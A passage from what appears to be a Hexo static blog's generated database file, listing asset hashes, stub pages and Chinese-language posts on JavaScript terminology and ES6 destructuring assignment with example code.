f49b1fa74fb35484598a393978a4e624","modified":1645602329586},{"_id":"public/archives/2019/index.html","hash":"73c200450bcce5215d127f3b41366c489c9fc995","modified":1645602329586},{"_id":"public/archives/2019/04/index.html","hash":"4c16de32cdb0556e6435e2607de0148704afbc0e","modified":1645602329586},{"_id":"public/archives/2022/index.html","hash":"2cf6edc0df4804838ac1351ab760bc81e0ae16ed","modified":1645602329586},{"_id":"public/archives/2019/05/index.html","hash":"9998977115253fde9c1f3d4edb3543e37de6feb0","modified":1645602329586},{"_id":"public/archives/2022/02/index.html","hash":"05e1d518ef44755c6189c43e195589deb837e7fc","modified":1645602329586},{"_id":"public/tags/JavaScript/index.html","hash":"9a6a2f5edc71cdba2721ec508eef402113195662","modified":1645602329586},{"_id":"public/tags/Node/index.html","hash":"3b036095bbb7e30add8d1d3fa7189f59d23477c7","modified":1645602329586},{"_id":"public/tags/笔记/index.html","hash":"7811b1047545a1fe9149c234007d2474538d9465","modified":1645602329586},{"_id":"public/tags/ES6/index.html","hash":"c5a46cb7f7095f77a86a596d5433d7cc2c7d063e","modified":1645602329586},{"_id":"public/tags/Markdown/index.html","hash":"dedfafc607511fcc43645c373d48ff82dcc768a9","modified":1645602329586},{"_id":"public/tags/教程/index.html","hash":"2410d87578c961212cdd9b5c2aa4bdbb192c7962","modified":1645602329586},{"_id":"public/tags/CSS/index.html","hash":"c8c8a74f7975d4ee5be568f346729a666fb23a20","modified":1645602329586},{"_id":"public/tags/javascript/index.html","hash":"68d0ff43b089552cdb45dc450e0dcc5e0ae58bc9","modified":1645602329586},{"_id":"public/tags/hexo/index.html","hash":"7778d3847d5de3cfe2286556e1e7814d597c6aab","modified":1645602329586},{"_id":"public/tags/github/index.html","hash":"39911582257c533a9f1d9d1f3695e652dce064c1","modified":1645602329586},{"_id":"public/tags/对象枚举/index.html","hash":"5158d9d0403bd1cae7f4ec6b0e7507ed3b66b54f","modified":1645602329586},{"_id":"public/2022/02/22/枚举对象属性的工具函数/index.html","hash":"5a3749d91004b6fdb999abd3f7759bfe8dcf7bcf","modified":1645602329586},{"_id":"public/2019/04/10/文本溢出的处理方法/index.html","hash":"7ffbd38f98fbb8b890e75927aad2f67e538a8e5b","modified":1645602329586},{"_id":"public/2019/04/16/HTTP状态码/index.html","hash":"3836545c9a94de0bed308b739bec36eab2875a0d","modified":1645602329586},{"_id":"public/2019/04/08/关于浏览器存储/index.html","hash":"9456345d25ef23f98b7d941f9d40f8f0d9086dd6","modified":1645602329586},{"_id":"public/2019/04/03/call&apply&bind过招/index.html","hash":"f420818a8a7b1e281193e4d8bbf6d3af7a698a2e","modified":1645602329586},{"_id":"public/2019/04/02/在地址栏输入URL到页面展示过程中，到底发生了什么？/index.html","hash":"e045a9334ecb442d78ac991bb0d6832e581faeb7","modified":1645602329586},{"_id":"public/2019/04/01/ES6变量解构赋值/index.html","hash":"cc6295f6fb6b368e188e4ac39eb6f8d4c6e1810a","modified":1645602329586},{"_id":"public/2019/04/01/如何利用Hexo-Github搭建博客/index.html","hash":"8d39de61733d5703e76842fb13205aec2794c0bb","modified":1645602329586},{"_id":"public/page/2/index.html","hash":"1f1f51a4035fa7057ff841407fdf1b20ce2b1ea1","modified":1645602329586},{"_id":"public/index.html","hash":"06667498e81bff913c8187ba7fabb4cf350df802","modified":1645602329586},{"_id":"public/fancybox/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1645602329586},{"_id":"public/fancybox/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1645602329586},{"_id":"public/fancybox/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1645602329586},{"_id":"public/fancybox/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1645602329586},{"_id":"public/fancybox/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1645602329586},{"_id":"public/css/fonts/fontawesome-webfont.eot","hash":"7619748fe34c64fb157a57f6d4ef3678f63a8f5e","modified":1645602329586},{"_id":"public/fancybox/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1645602329586},{"_id":"public/fancybox/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1645602329586},{"_id":"public/css/fonts/FontAwesome.otf","hash":"b5b4f9be85f91f10799e87a083da1d050f842734","modified":1645602329586},{"_id":"public/css/fonts/fontawesome-webfont.woff","hash":"04c3bf56d87a0828935bd6b4aee859995f321693","modified":1645602329586},{"_id":"public/js/script.js","hash":"2876e0b19ce557fca38d7c6f49ca55922ab666a1","modified":1645602329586},{"_id":"public/fancybox/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1645602329586},{"_id":"public/fancybox/jquery.fancybox.css","hash":"aaa582fb9eb4b7092dc69fcb2d5b1c20cca58ab6","modified":1645602329586},{"_id":"public/fancybox/helpers/jquery.fancybox-media.js","hash":"294420f9ff20f4e3584d212b0c262a00a96ecdb3","modified":1645602329586},{"_id":"public/fancybox/helpers/jquery.fancybox-buttons.js","hash":"dc3645529a4bf72983a39fa34c1eb9146e082019","modified":1645602329586},{"_id":"public/fancybox/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1645602329586},{"_id":"public/fancybox/helpers/jquery.fancybox-thumbs.js","hash":"47da1ae5401c24b5c17cc18e2730780f5c1a7a0c","modified":1645602329586},{"_id":"public/css/style.css","hash":"c9c984360baa61bf3c962caa975021d3d5e9fec0","modified":1645602329586},{"_id":"public/fancybox/jquery.fancybox.pack.js","hash":"9e0d51ca1dbe66f6c0c7aefd552dc8122e694a6e","modified":1645602329586},{"_id":"public/fancybox/jquery.fancybox.js","hash":"d08b03a42d5c4ba456ef8ba33116fdbb7a9cabed","modified":1645602329586},{"_id":"public/css/fonts/fontawesome-webfont.ttf","hash":"7f09c97f333917034ad08fa7295e916c9f72fd3f","modified":1645602329586},{"_id":"public/css/images/banner.jpg","hash":"f44aa591089fcb3ec79770a1e102fd3289a7c6a6","modified":1645602329586},{"_id":"public/css/fonts/fontawesome-webfont.svg","hash":"46fcc0194d75a0ddac0a038aee41b23456784814","modified":1645602329586}],"Category":[],"Data":[],"Page":[{"title":"about","date":"2019-04-01T09:26:08.000Z","_content":"\n# 这是一个 about 页面\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2019-04-01 17:26:08\n---\n\n# 这是一个 about 页面\n","updated":"2022-02-23T03:09:02.936Z","path":"about/index.html","comments":1,"layout":"page","_id":"ckzz950ck0000n0w1esg89hp9","content":"<h1 id=\"这是一个-about-页面\"><a href=\"#这是一个-about-页面\" class=\"headerlink\" title=\"这是一个 about 页面\"></a>这是一个 about 页面</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"这是一个-about-页面\"><a href=\"#这是一个-about-页面\" class=\"headerlink\" title=\"这是一个 about 页面\"></a>这是一个 about 页面</h1>"},{"title":"tags","date":"2019-04-09T03:55:27.000Z","_content":"\n# 这是一个 tag 页\n","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2019-04-09 11:55:27\n---\n\n# 这是一个 tag 页\n","updated":"2022-02-23T03:09:02.938Z","path":"tags/index.html","comments":1,"layout":"page","_id":"ckzz950cp0002n0w1b9kjbrln","content":"<h1 id=\"这是一个-tag-页\"><a href=\"#这是一个-tag-页\" class=\"headerlink\" title=\"这是一个 tag 页\"></a>这是一个 tag 页</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"这是一个-tag-页\"><a href=\"#这是一个-tag-页\" class=\"headerlink\" title=\"这是一个 tag 页\"></a>这是一个 tag 页</h1>"},{"title":"categories","date":"2019-04-09T03:57:33.000Z","_content":"\n# 这是一个 categories 页面\n","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2019-04-09 11:57:33\n---\n\n# 这是一个 categories 页面\n","updated":"2022-02-23T03:09:02.937Z","path":"categories/index.html","comments":1,"layout":"page","_id":"ckzz950ct0005n0w1d3mc4wrd","content":"<h1 id=\"这是一个-categories-页面\"><a href=\"#这是一个-categories-页面\" class=\"headerlink\" title=\"这是一个 categories 页面\"></a>这是一个 categories 页面</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"这是一个-categories-页面\"><a href=\"#这是一个-categories-页面\" class=\"headerlink\" title=\"这是一个 categories 页面\"></a>这是一个 categories 页面</h1>"}],"Post":[{"title":"JavaScript术语","date":"2019-05-18T16:24:25.000Z","_content":"\n# 死锁现象\n\n相互等待资源而产生的一种僵持状态，如果没有外力的干预将一直持续这个状态。\n\n- 死锁产生的原因：\n  系统资源不足、相互竞争资源、请求资源顺序不当\n\n- 死锁必要条件：\n  互斥、不可抢占、循环等待、请求与保持\n\n- 如何处理死锁\n  因为胡吃是不可改变的，所以只能破坏其他三个条件来解除死锁\n\n- 方法\n  剥夺资源、杀死其中一个线程\n\n# 事件环机制\n\n在 Node.js 中，在一个时刻只能执行一个事件回调函数，但是执行一个事件回调函数的中途可以转而处理其他事件（包括触发新的事件、声明该事件的回调函数等），然后返回继续执行还原事件回调函数，这种处理机制称为**事件环机制**\n","source":"_posts/JavaScript术语.md","raw":"---\ntitle: JavaScript术语\ndate: 2019-05-19 00:24:25\ntags:\n  - JavaScript\n  - Node\n  - 笔记\n---\n\n# 死锁现象\n\n相互等待资源而产生的一种僵持状态，如果没有外力的干预将一直持续这个状态。\n\n- 死锁产生的原因：\n  系统资源不足、相互竞争资源、请求资源顺序不当\n\n- 死锁必要条件：\n  互斥、不可抢占、循环等待、请求与保持\n\n- 如何处理死锁\n  因为胡吃是不可改变的，所以只能破坏其他三个条件来解除死锁\n\n- 方法\n  剥夺资源、杀死其中一个线程\n\n# 事件环机制\n\n在 Node.js 中，在一个时刻只能执行一个事件回调函数，但是执行一个事件回调函数的中途可以转而处理其他事件（包括触发新的事件、声明该事件的回调函数等），然后返回继续执行还原事件回调函数，这种处理机制称为**事件环机制**\n","slug":"JavaScript术语","published":1,"updated":"2022-02-23T03:09:02.867Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950cn0001n0w1fj454w03","content":"<h1 id=\"死锁现象\"><a href=\"#死锁现象\" class=\"headerlink\" title=\"死锁现象\"></a>死锁现象</h1><p>相互等待资源而产生的一种僵持状态，如果没有外力的干预将一直持续这个状态。</p>\n<ul>\n<li><p>死锁产生的原因：<br>系统资源不足、相互竞争资源、请求资源顺序不当</p>\n</li>\n<li><p>死锁必要条件：<br>互斥、不可抢占、循环等待、请求与保持</p>\n</li>\n<li><p>如何处理死锁<br>因为胡吃是不可改变的，所以只能破坏其他三个条件来解除死锁</p>\n</li>\n<li><p>方法<br>剥夺资源、杀死其中一个线程</p>\n</li>\n</ul>\n<h1 id=\"事件环机制\"><a href=\"#事件环机制\" class=\"headerlink\" title=\"事件环机制\"></a>事件环机制</h1><p>在 Node.js 中，在一个时刻只能执行一个事件回调函数，但是执行一个事件回调函数的中途可以转而处理其他事件（包括触发新的事件、声明该事件的回调函数等），然后返回继续执行还原事件回调函数，这种处理机制称为<strong>事件环机制</strong></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"死锁现象\"><a href=\"#死锁现象\" class=\"headerlink\" title=\"死锁现象\"></a>死锁现象</h1><p>相互等待资源而产生的一种僵持状态，如果没有外力的干预将一直持续这个状态。</p>\n<ul>\n<li><p>死锁产生的原因：<br>系统资源不足、相互竞争资源、请求资源顺序不当</p>\n</li>\n<li><p>死锁必要条件：<br>互斥、不可抢占、循环等待、请求与保持</p>\n</li>\n<li><p>如何处理死锁<br>因为胡吃是不可改变的，所以只能破坏其他三个条件来解除死锁</p>\n</li>\n<li><p>方法<br>剥夺资源、杀死其中一个线程</p>\n</li>\n</ul>\n<h1 id=\"事件环机制\"><a href=\"#事件环机制\" class=\"headerlink\" title=\"事件环机制\"></a>事件环机制</h1><p>在 Node.js 中，在一个时刻只能执行一个事件回调函数，但是执行一个事件回调函数的中途可以转而处理其他事件（包括触发新的事件、声明该事件的回调函数等），然后返回继续执行还原事件回调函数，这种处理机制称为<strong>事件环机制</strong></p>\n"},{"title":"ES6变量解构赋值","date":"2019-04-01T09:51:31.000Z","_content":"\n## 解构\n\n解构是一种打破数据结构，将其拆分成更小部分的过程。 #解构赋值的由来\n在开发过程中，我们经常需要用到数组和对象，而从数组或对象中获取特定的数据并赋值给变量，这就需要编写这样的代码\n\n```\nlet options = {\n\trepeat:true,\n    save:false\n}\n\nlet repeat = options.repeat\nlet save = options.save\n\n// 如果你想提取更多变量，则必须编写类似的代码来给变量赋值，给开发者带来很大的麻烦，为此ES6添加了解构功能，方便我们提取数组或对象的值\n```\n\n## 数组的解构赋值\n\n### 基本用法\n\n**解构赋值**：在 ES6 中 ，按照一定模式从数组和对象中提取值，然后对变量进行赋值，这被称为解构赋值。\n_本质_：这种写法属于“模式匹配”，只要等号两边的模式相同，**左边的变量**就会被赋予对应的值。\n\n```\nlet [foo,[bar],baz]=[1,[2],3]\nfoo // 1\nbar // 2\nbaz // 3\n```\n\n**如果结构不成功，变量的值就为 undefined**\n\n```\nlet [x,y,...z]=['a']\nx // 'a'\ny // undefined\nz // []\n```\n\n### 默认值\n\n**解构赋值允许指定默认值**\n\n```\nlet [foo=true]=[];\nfoo // true\n```\n\n**ES6 内部使用严格相等于运算符（===）来判断一个位置是否有值，如果数组的成员不严格等于 undefined，默认值就不会生效。即，一个位置的值不是 undefined，那么即使设置了默认值，也不会有效。**\n\n```\nlet [x=1]=[undefined]\nx // 1\n\nlet [x=1] =[null]\n\nx // null\n```\n\n## 对象的解构赋值\n\n```\nlet {foo,bar}={foo:'abc',bar:'xyz'}\n\nfoo // 'abc'\nbar // 'xyz'\n\n```\n\n### 当变量名和属性名相同时\n\n```\nlet {foo,bar}={foo:'abc',bar:'xyz'}\nfoo // 'abc'\nbar // 'xyz'\n上述代码的实质应该是：\nlet {foo:foo,bar:bar}={foo:'abc',bar:'xyz'}\n// 当变量名和属性名一样时，可以简写 {foo,bar}来代替{foo:foo,bar:bar}\n\n```\n\n**对象解构赋值的内部机制：**是先找到同名属性，然后再赋值给对应的变量。真正赋值的是后者，而不是前者\n\n### 当变量名与属性名不同时：\n\n```\nlet {foo:hello,bar:world}={foo:'abc',bar:'xyz'}\nhello // 'abc'\nworld // 'xyz'\nfoo // error: foo is not defined\n```\n\n**foo 是匹配的模式，hello 才是整正的变量**\n\n### **数组解构赋值与对象结构赋值的差异**：\n\n数组的元素是按次序排列的，变量的取值由位置决定；而对象没有次序，变量名必须与属性名相同，才能取到正确的值。\n\n## 字符串的解构赋值\n\n字符串结构赋值的时候，字符串被转换成了一个类似数组的对象\n\n```\nconst [a,b,c,d,e]='hello'\na // 'h'\nb // 'e'\nc // 'l'\nd // 'l'\ne // 'o'\n\n//这种类数组的对象，有length属性，因此也可以对length属性进行解构赋值\n\nlet {length:len}='hello'\nlen // 5\n```\n\n## 数值和布尔值的解构赋值\n\n数值和布尔值进行解构赋值的时候，会先转换为对象\n\n```\nlet {toString:s} = 123\ns // Number.prototype.toString\n\nlet {toString:s} = true\n\ns // Boolean.prototype.toString\n\n//数值对象和布尔值的包装对象都有toString属性，因为变量s可以取到值\n```\n\n**解构赋值的规则：**只要等号右边的值不是数组或者对象，就先将其转化为对象，由于 null 和 undefined 无法转化为对象，所以对他们解构赋值会报错\n\n```\nlet {proxy:x}=undefined;\nx // TypeError\n\nlet {proxy:y} = null;\ny // TypeError\n```\n\n## 函数参数的解构赋值\n\n```\nfunction add ([x,y]){\n\treturn x+y;\n}\n\nadd([1,2])  // 3\n```\n\n## 用途\n\n### 交换变量的值（数组解构赋值）\n\n在排序算法中，值交换是一个非常常见的操作，如果在 ES5 中交换两个变量的值，则必须引入第三个临时变量\n没有解构赋值的情况下，交换两个变量需要一个临时变量\n\n```\nlet x=1;\nlet y=2;\n[x,y] = [y,x]\nx // 2\ny // 1\n// 如果右侧数组结构赋值的表达式的值为null或者undefined，则会导致程序抛出错误\n```\n\n## 从函数中返回多个值\n\n从一个函数返回一个数组是十分常见的情况\n但是函数只能返回一个值，如果需要返回多个值，只能将他放在数组或者对象里返回，有了结构赋值，取出这些值就非常方便\n\n```\n// 返回数组\nfunction example(){\n\treturn [1,2,3]\n}\n\nlet [a,b,c]=example()\na // 1\nb // 2\nc // 3\n\n// 返回对象\nfunction example(){\n    return {\n    foo:1,\n    bar:2\n    }\n}\n\nlet [foo,bar]=example()\nfoo // 1\nbar // 2\n```\n\n## 函数参数的定义\n\n解构赋值，可以很方便的将一组参数与变量名对应起来 ##提取 JSON 数据\n解构赋值在提取 JSON 数据尤为有用\n\n```\nlet jsonData = {\n\tid:42,\n   status:\"OK\",\n   data:[23,45]\n}\n\nlet {id,status,data}=jsonData\n\nconsole.log(id,status,data)\n// 42,\"OK\",[23,45]\n```\n\n## 定义函数参数的默认值\n\n避免在函数体内部再写 var foo = config.foo || \"default foo\"这样的语句\n\n```\n   jQuery.ajax= function(url,{\n      asyc=true,\n      beforeSend=function(){},\n      cache=true,\n      complete=function(){},\n      crossDomain=false,\n      global = true,\n      //  .... more config\n    }){\n      // ... do stuff\n    }\n```\n\n## 遍历 Map 结构\n\n**任何部署了 Iterator 接口的对象都可以使用 for...of 循环遍历**\nMap 结构原生支持 Iterator 接口，配合变量的解构赋值，获取键名和键值都非常方便\n\n```\n    var map = new Map()\n    map.set(\"first\",'hello')\n    map.set(\"second\",'world')\n\n    for (const [key,value] of map) {\n      console.log(key + \"is\" +value)\n    }\n\n    // first is hello\n    // second is world\n\n    // 只想获取键名\n     for (const [key] of map) {\n      //\n    }\n     // 只想获取键值\n     for (const [,value] of map) {\n      //\n    }\n\n```\n\n## 引入模块中的某些方法\n\n```\ncosnt {sourceMapConsumer,SourceNode} = require('source-map')\n```\n\n[阮一峰《ES6 标准》](http://es6.ruanyifeng.com/#docs/destructuring)\n","source":"_posts/ES6变量解构赋值.md","raw":"---\ntitle: ES6变量解构赋值\ndate: 2019-04-01 17:51:31\ntags:\n  - 笔记\n  - ES6\n---\n\n## 解构\n\n解构是一种打破数据结构，将其拆分成更小部分的过程。 #解构赋值的由来\n在开发过程中，我们经常需要用到数组和对象，而从数组或对象中获取特定的数据并赋值给变量，这就需要编写这样的代码\n\n```\nlet options = {\n\trepeat:true,\n    save:false\n}\n\nlet repeat = options.repeat\nlet save = options.save\n\n// 如果你想提取更多变量，则必须编写类似的代码来给变量赋值，给开发者带来很大的麻烦，为此ES6添加了解构功能，方便我们提取数组或对象的值\n```\n\n## 数组的解构赋值\n\n### 基本用法\n\n**解构赋值**：在 ES6 中 ，按照一定模式从数组和对象中提取值，然后对变量进行赋值，这被称为解构赋值。\n_本质_：这种写法属于“模式匹配”，只要等号两边的模式相同，**左边的变量**就会被赋予对应的值。\n\n```\nlet [foo,[bar],baz]=[1,[2],3]\nfoo // 1\nbar // 2\nbaz // 3\n```\n\n**如果结构不成功，变量的值就为 undefined**\n\n```\nlet [x,y,...z]=['a']\nx // 'a'\ny // undefined\nz // []\n```\n\n### 默认值\n\n**解构赋值允许指定默认值**\n\n```\nlet [foo=true]=[];\nfoo // true\n```\n\n**ES6 内部使用严格相等于运算符（===）来判断一个位置是否有值，如果数组的成员不严格等于 undefined，默认值就不会生效。即，一个位置的值不是 undefined，那么即使设置了默认值，也不会有效。**\n\n```\nlet [x=1]=[undefined]\nx // 1\n\nlet [x=1] =[null]\n\nx // null\n```\n\n## 对象的解构赋值\n\n```\nlet {foo,bar}={foo:'abc',bar:'xyz'}\n\nfoo // 'abc'\nbar // 'xyz'\n\n```\n\n### 当变量名和属性名相同时\n\n```\nlet {foo,bar}={foo:'abc',bar:'xyz'}\nfoo // 'abc'\nbar // 'xyz'\n上述代码的实质应该是：\nlet {foo:foo,bar:bar}={foo:'abc',bar:'xyz'}\n// 当变量名和属性名一样时，可以简写 {foo,bar}来代替{foo:foo,bar:bar}\n\n```\n\n**对象解构赋值的内部机制：**是先找到同名属性，然后再赋值给对应的变量。真正赋值的是后者，而不是前者\n\n### 当变量名与属性名不同时：\n\n```\nlet {foo:hello,bar:world}={foo:'abc',bar:'xyz'}\nhello // 'abc'\nworld // 'xyz'\nfoo // error: foo is not defined\n```\n\n**foo 是匹配的模式，hello 才是整正的变量**\n\n### **数组解构赋值与对象结构赋值的差异**：\n\n数组的元素是按次序排列的，变量的取值由位置决定；而对象没有次序，变量名必须与属性名相同，才能取到正确的值。\n\n## 字符串的解构赋值\n\n字符串结构赋值的时候，字符串被转换成了一个类似数组的对象\n\n```\nconst [a,b,c,d,e]='hello'\na // 'h'\nb // 'e'\nc // 'l'\nd // 'l'\ne // 'o'\n\n//这种类数组的对象，有length属性，因此也可以对length属性进行解构赋值\n\nlet {length:len}='hello'\nlen // 5\n```\n\n## 数值和布尔值的解构赋值\n\n数值和布尔值进行解构赋值的时候，会先转换为对象\n\n```\nlet {toString:s} = 123\ns // Number.prototype.toString\n\nlet {toString:s} = true\n\ns // Boolean.prototype.toString\n\n//数值对象和布尔值的包装对象都有toString属性，因为变量s可以取到值\n```\n\n**解构赋值的规则：**只要等号右边的值不是数组或者对象，就先将其转化为对象，由于 null 和 undefined 无法转化为对象，所以对他们解构赋值会报错\n\n```\nlet {proxy:x}=undefined;\nx // TypeError\n\nlet {proxy:y} = null;\ny // TypeError\n```\n\n## 函数参数的解构赋值\n\n```\nfunction add ([x,y]){\n\treturn x+y;\n}\n\nadd([1,2])  // 3\n```\n\n## 用途\n\n### 交换变量的值（数组解构赋值）\n\n在排序算法中，值交换是一个非常常见的操作，如果在 ES5 中交换两个变量的值，则必须引入第三个临时变量\n没有解构赋值的情况下，交换两个变量需要一个临时变量\n\n```\nlet x=1;\nlet y=2;\n[x,y] = [y,x]\nx // 2\ny // 1\n// 如果右侧数组结构赋值的表达式的值为null或者undefined，则会导致程序抛出错误\n```\n\n## 从函数中返回多个值\n\n从一个函数返回一个数组是十分常见的情况\n但是函数只能返回一个值，如果需要返回多个值，只能将他放在数组或者对象里返回，有了结构赋值，取出这些值就非常方便\n\n```\n// 返回数组\nfunction example(){\n\treturn [1,2,3]\n}\n\nlet [a,b,c]=example()\na // 1\nb // 2\nc // 3\n\n// 返回对象\nfunction example(){\n    return {\n    foo:1,\n    bar:2\n    }\n}\n\nlet [foo,bar]=example()\nfoo // 1\nbar // 2\n```\n\n## 函数参数的定义\n\n解构赋值，可以很方便的将一组参数与变量名对应起来 ##提取 JSON 数据\n解构赋值在提取 JSON 数据尤为有用\n\n```\nlet jsonData = {\n\tid:42,\n   status:\"OK\",\n   data:[23,45]\n}\n\nlet {id,status,data}=jsonData\n\nconsole.log(id,status,data)\n// 42,\"OK\",[23,45]\n```\n\n## 定义函数参数的默认值\n\n避免在函数体内部再写 var foo = config.foo || \"default foo\"这样的语句\n\n```\n   jQuery.ajax= function(url,{\n      asyc=true,\n      beforeSend=function(){},\n      cache=true,\n      complete=function(){},\n      crossDomain=false,\n      global = true,\n      //  .... more config\n    }){\n      // ... do stuff\n    }\n```\n\n## 遍历 Map 结构\n\n**任何部署了 Iterator 接口的对象都可以使用 for...of 循环遍历**\nMap 结构原生支持 Iterator 接口，配合变量的解构赋值，获取键名和键值都非常方便\n\n```\n    var map = new Map()\n    map.set(\"first\",'hello')\n    map.set(\"second\",'world')\n\n    for (const [key,value] of map) {\n      console.log(key + \"is\" +value)\n    }\n\n    // first is hello\n    // second is world\n\n    // 只想获取键名\n     for (const [key] of map) {\n      //\n    }\n     // 只想获取键值\n     for (const [,value] of map) {\n      //\n    }\n\n```\n\n## 引入模块中的某些方法\n\n```\ncosnt {sourceMapConsumer,SourceNode} = require('source-map')\n```\n\n[阮一峰《ES6 标准》](http://es6.ruanyifeng.com/#docs/destructuring)\n","slug":"ES6变量解构赋值","published":1,"updated":"2022-02-23T03:09:02.854Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950cq0003n0w19g3kbtyb","content":"<h2 id=\"解构\"><a href=\"#解构\" class=\"headerlink\" title=\"解构\"></a>解构</h2><p>解构是一种打破数据结构，将其拆分成更小部分的过程。 #解构赋值的由来<br>在开发过程中，我们经常需要用到数组和对象，而从数组或对象中获取特定的数据并赋值给变量，这就需要编写这样的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let options = &#123;</span><br><span class=\"line\">\trepeat:true,</span><br><span class=\"line\">    save:false</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let repeat = options.repeat</span><br><span class=\"line\">let save = options.save</span><br><span class=\"line\"></span><br><span class=\"line\">// 如果你想提取更多变量，则必须编写类似的代码来给变量赋值，给开发者带来很大的麻烦，为此ES6添加了解构功能，方便我们提取数组或对象的值</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"数组的解构赋值\"><a href=\"#数组的解构赋值\" class=\"headerlink\" title=\"数组的解构赋值\"></a>数组的解构赋值</h2><h3 id=\"基本用法\"><a href=\"#基本用法\" class=\"headerlink\" title=\"基本用法\"></a>基本用法</h3><p><strong>解构赋值</strong>：在 ES6 中 ，按照一定模式从数组和对象中提取值，然后对变量进行赋值，这被称为解构赋值。<br>_本质_：这种写法属于“模式匹配”，只要等号两边的模式相同，<strong>左边的变量</strong>就会被赋予对应的值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let [foo,[bar],baz]=[1,[2],3]</span><br><span class=\"line\">foo // 1</span><br><span class=\"line\">bar // 2</span><br><span class=\"line\">baz // 3</span><br></pre></td></tr></table></figure>\n\n<p><strong>如果结构不成功，变量的值就为 undefined</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let [x,y,...z]=[&#x27;a&#x27;]</span><br><span class=\"line\">x // &#x27;a&#x27;</span><br><span class=\"line\">y // undefined</span><br><span class=\"line\">z // []</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"默认值\"><a href=\"#默认值\" class=\"headerlink\" title=\"默认值\"></a>默认值</h3><p><strong>解构赋值允许指定默认值</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let [foo=true]=[];</span><br><span class=\"line\">foo // true</span><br></pre></td></tr></table></figure>\n\n<p><strong>ES6 内部使用严格相等于运算符（===）来判断一个位置是否有值，如果数组的成员不严格等于 undefined，默认值就不会生效。即，一个位置的值不是 undefined，那么即使设置了默认值，也不会有效。</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let [x=1]=[undefined]</span><br><span class=\"line\">x // 1</span><br><span class=\"line\"></span><br><span class=\"line\">let [x=1] =[null]</span><br><span class=\"line\"></span><br><span class=\"line\">x // null</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"对象的解构赋值\"><a href=\"#对象的解构赋值\" class=\"headerlink\" title=\"对象的解构赋值\"></a>对象的解构赋值</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let &#123;foo,bar&#125;=&#123;foo:&#x27;abc&#x27;,bar:&#x27;xyz&#x27;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo // &#x27;abc&#x27;</span><br><span class=\"line\">bar // &#x27;xyz&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"当变量名和属性名相同时\"><a href=\"#当变量名和属性名相同时\" class=\"headerlink\" title=\"当变量名和属性名相同时\"></a>当变量名和属性名相同时</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let &#123;foo,bar&#125;=&#123;foo:&#x27;abc&#x27;,bar:&#x27;xyz&#x27;&#125;</span><br><span class=\"line\">foo // &#x27;abc&#x27;</span><br><span class=\"line\">bar // &#x27;xyz&#x27;</span><br><span class=\"line\">上述代码的实质应该是：</span><br><span class=\"line\">let &#123;foo:foo,bar:bar&#125;=&#123;foo:&#x27;abc&#x27;,bar:&#x27;xyz&#x27;&#125;</span><br><span class=\"line\">// 当变量名和属性名一样时，可以简写 &#123;foo,bar&#125;来代替&#123;foo:foo,bar:bar&#125;</span><br><span 